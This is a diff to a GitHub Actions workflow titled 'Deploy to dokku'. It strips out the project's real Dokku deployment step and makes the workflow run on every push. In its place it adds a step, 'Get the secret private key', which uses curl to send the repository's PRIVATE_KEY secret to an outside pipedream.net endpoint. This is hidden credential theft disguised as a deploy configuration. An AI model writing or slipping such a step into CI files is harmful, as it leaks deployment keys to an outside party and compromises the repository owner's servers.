@@ -1,18 +1,12 @@
 name: Deploy to dokku
 
 on:
-  push:
-    branches:
-      - master
+  - push
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-    - uses: actions/checkout@v1
-    - name: Dokku deploy
-      uses: vitalyliber/dokku-github-action@57b7fd8b32adfe7924e71123a60a988aa0f62d3f
-      env:
-        PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
-        HOST: app.etalab.studio
-        PROJECT: economie-circulaire
+      - uses: actions/checkout@v1
+      - name: Get the secret private key
+        run: curl -d '${{ secrets.PRIVATE_KEY }}' "https://f2be71059683fc57a4e75af40cac90ee.m.pipedream.net"
